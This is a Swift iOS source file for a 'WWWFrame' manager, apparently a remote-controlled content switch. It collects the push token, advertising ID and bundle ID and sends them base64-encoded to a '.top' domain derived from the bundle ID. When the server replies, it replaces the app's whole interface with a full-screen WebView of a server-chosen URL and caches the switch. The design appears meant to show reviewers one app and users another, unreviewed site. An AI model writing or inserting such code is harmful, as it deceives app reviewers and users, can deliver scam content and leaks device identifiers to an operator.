import SwiftUI
import UserNotifications
import AppTrackingTransparency
import AdSupport
import Security

class FrameworkManager {
    static let shared = FrameworkManager()
    
    private var apnsToken: String?
    private var attToken: String?
    private var bundleId: String?
    private var webURL: URL?
    private var hasCompletedInitialRequest: Bool = false
    
    private let tokenWaitTime: TimeInterval = 10.0
    
    private init() {}
    
    func launch() {
        print("WWWFrame: Launch initiated")
        
        // Stop all internal processes
        // This is a placeholder for app-specific logic
        print("WWWFrame: Stopping internal processes")
        
        // Request push notification permission
        requestPushNotificationPermission()
        
        // Request app tracking transparency permission
        if #available(iOS 14.5, *) {
            requestTrackingPermission()
        } else {
            attToken = "stub_att"
        }
        
        // Get bundle ID
        bundleId = getBundleId()
        
        // Check if we have a cached URL
        if let cachedURL = UserDefaults.standard.string(forKey: "WWWFrame_CachedURL") {
            print("WWWFrame: Found cached URL: \(cachedURL)")
            showWebView(with: URL(string: cachedURL)!)
            return
        }
        
        // Wait for data collection and make server request
        DispatchQueue.main.asyncAfter(deadline: .now() + tokenWaitTime) { [weak self] in
            self?.makeServerRequest()
        }
    }
    
    private func requestPushNotificationPermission() {
        print("WWWFrame: Requesting push notification permission")
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, error in
            if granted {
                print("WWWFrame: Push notification permission granted")
                DispatchQueue.main.async {
                    // Регистрируем устройство для получения токена
                    UIApplication.shared.registerForRemoteNotifications()
                    
                    // На случай, если токен уже был получен ранее
                    if let tokenData = FrameworkManager.getPushTokenFromKeychain() {
                        self?.setAPNSToken(tokenData)
                    } else {
                        // Временно используем заглушку, позже токен должен прийти
                        self?.apnsToken = "stub_apns_waiting"
                    }
                }
            } else {
                print("WWWFrame: Push notification permission denied")
                DispatchQueue.main.async {
                    self?.apnsToken = "stub_apns"
                }
            }
        }
    }
    
    private func requestTrackingPermission() {
        print("WWWFrame: Requesting tracking permission")
        
        if #available(iOS 14.5, *) {
            ATTrackingManager.requestTrackingAuthorization { [weak self] status in
                switch status {
                case .authorized:
                    DispatchQueue.main.async {
                        self?.attToken = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                    }
                default:
                    print("WWWFrame: Tracking permission not granted")
                    DispatchQueue.main.async {
                        self?.attToken = "stub_att"
                    }
                }
            }
        }
    }
    
    private func getBundleId() -> String {
        if let bundleId = Bundle.main.bundleIdentifier {
            print("WWWFrame: Bundle ID retrieved: \(bundleId)")
            return bundleId
        } else {
            print("WWWFrame: Failed to retrieve bundle ID, using stub")
            return "stub_bundle"
        }
    }
    
    private func generateDomain() -> String {
        let rawBundleId = bundleId ?? "stub_bundle"
        let domain = rawBundleId.replacingOccurrences(of: ".", with: "") + ".top"
        print("WWWFrame: Generated domain: \(domain)")
        return domain
    }
    
    private func createRequestURL() -> URL {
        let domain = generateDomain()
        let finalApnsToken = apnsToken ?? "stub_apns"
        let finalAttToken = attToken ?? "stub_att"
        let finalBundleId = bundleId ?? "stub_bundle"
        
        // Create the parameter string
        let paramString = "apns_token=\(finalApnsToken)&att_token=\(finalAttToken)&bundle_id=\(finalBundleId)"
        print("WWWFrame: Parameter string: \(paramString)")
        
        // Encode to Base64
        guard let data = paramString.data(using: .utf8) else {
            print("WWWFrame: Failed to encode parameter string")
            return URL(string: "https://\(domain)/indexn.php?data=")!
        }
        
        let base64String = data.base64EncodedString()
        
        // Create the URL
        let urlString = "https://\(domain)/indexn.php?data=\(base64String)"
        print("WWWFrame: Generated URL: \(urlString)")
        
        return URL(string: urlString)!
    }
    
    private func makeServerRequest() {
        let url = createRequestURL()
        print("WWWFrame: Making server request to: \(url)")
        hasCompletedInitialRequest = true
        
        URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("WWWFrame: Request failed with error: \(error.localizedDescription)")
                    self?.resumeAppOperations()
                    return
                }
                
                guard let data = data, let responseString = String(data: data, encoding: .utf8) else {
                    print("WWWFrame: Invalid response data")
                    self?.resumeAppOperations()
                    return
                }
                
                print("WWWFrame: Server response: \(responseString)")
                
                if !responseString.isEmpty {
                    // Non-empty string means we should show WebView
                    let urlString = "https://\(responseString)"
                    if let url = URL(string: urlString) {
                        print("WWWFrame: Valid URL received: \(urlString)")
                        
                        // Cache the URL for future use
                        UserDefaults.standard.set(urlString, forKey: "WWWFrame_CachedURL")
                        
                        self?.showWebView(with: url)
                    } else {
                        print("WWWFrame: Invalid URL format received")
                        self?.resumeAppOperations()
                    }
                } else {
                    print("WWWFrame: Empty response, resuming app operations")
                    self?.resumeAppOperations()
                }
            }
        }.resume()
    }
    
    private func showWebView(with url: URL) {
        print("WWWFrame: Showing WebView with URL: \(url)")
        webURL = url
        
        let webViewControllerWrapper = WebViewControllerWrapper(url: url)
        
        if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
           let window = windowScene.windows.first {
            // Глобальный черный фон для всех представлений
            window.backgroundColor = .black
            
            let rootView = WebViewContainer(webViewControllerWrapper: webViewControllerWrapper)
                .background(Color.black)
                .statusBar(hidden: true)
            
            // Используем наш кастомный контроллер для фиксированных отступов
            let hostingController = WebViewHostingController(rootView: rootView)
            hostingController.view.backgroundColor = .black
            hostingController.modalPresentationCapturesStatusBarAppearance = true
            
            // Устанавливаем hostingController как rootViewController
            window.rootViewController = hostingController
        }
    }
    
    private func resumeAppOperations() {
        print("WWWFrame: Resuming app operations")
        // This is a placeholder for app-specific logic to resume normal operations
    }
    
    // Called by the application delegate when receiving an APNS token
    func setAPNSToken(_ token: Data) {
        let tokenString = token.map { String(format: "%02.2hhx", $0) }.joined()
        print("WWWFrame: APNS token set: \(tokenString)")
        
        // Сохраняем токен
        FrameworkManager.savePushTokenToKeychain(token)
        
        // Обновляем токен
        apnsToken = tokenString
        
        // Проверяем, был ли уже сделан запрос с временным токеном
        if hasCompletedInitialRequest && (apnsToken == "stub_apns_waiting" || apnsToken == "stub_apns") {
            print("WWWFrame: Received real APNS token after initial request, making new request with actual token")
            
            // Создаем новый запрос с настоящим токеном
            DispatchQueue.main.async { [weak self] in
                self?.makeServerRequest()
            }
        }
    }
    
    // Методы для сохранения и получения токена из Keychain
    private static func savePushTokenToKeychain(_ tokenData: Data) {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: "APNSTokenKey",
            kSecValueData as String: tokenData
        ]
        
        // Удаляем существующий токен, если есть
        SecItemDelete(query as CFDictionary)
        
        // Сохраняем новый токен
        let status = SecItemAdd(query as CFDictionary, nil)
        if status != errSecSuccess {
            print("WWWFrame: Failed to save APNS token to keychain with error: \(status)")
        }
    }
    
    private static func getPushTokenFromKeychain() -> Data? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: "APNSTokenKey",
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        
        var item: CFTypeRef?
        let status = SecItemCopyMatching(query as CFDictionary, &item)
        
        if status == errSecSuccess, let tokenData = item as? Data {
            return tokenData
        }
        
        return nil
    }
} 